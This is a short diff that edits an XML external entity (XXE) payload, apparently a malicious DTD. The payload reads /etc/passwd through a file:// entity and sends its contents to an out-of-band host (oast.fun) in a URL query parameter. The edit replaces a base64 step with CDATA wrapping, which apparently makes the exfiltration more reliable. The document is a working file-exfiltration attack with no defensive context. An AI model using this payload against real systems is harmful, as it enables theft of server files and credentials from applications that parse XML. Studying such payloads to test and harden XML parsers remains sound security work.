@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % b64 "echo -n '%file;' | base64">
-<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%b64;'>">
+<!ENTITY % encode "<![CDATA[%file;]]>">
+<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://jbogwmzyhnnqmnbdpwqsu2sdb72du2hjq.oast.fun/?leak=%encode;'>">
 %send;
